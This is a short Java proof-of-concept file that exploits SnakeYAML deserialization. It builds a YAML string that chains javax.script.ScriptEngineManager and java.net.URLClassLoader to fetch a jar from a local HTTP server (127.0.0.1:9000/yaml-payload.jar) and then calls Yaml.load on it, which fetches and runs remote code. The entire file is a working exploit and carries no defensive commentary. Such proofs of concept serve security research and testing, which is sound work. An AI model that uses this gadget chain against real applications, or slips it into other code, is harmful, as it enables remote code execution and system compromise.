package spi;

import org.yaml.snakeyaml.Yaml;




public class True {
    public static void main(String[] args) {
        String s = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:9000/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        Yaml yaml = new Yaml();
        yaml.load(s);

    }
}
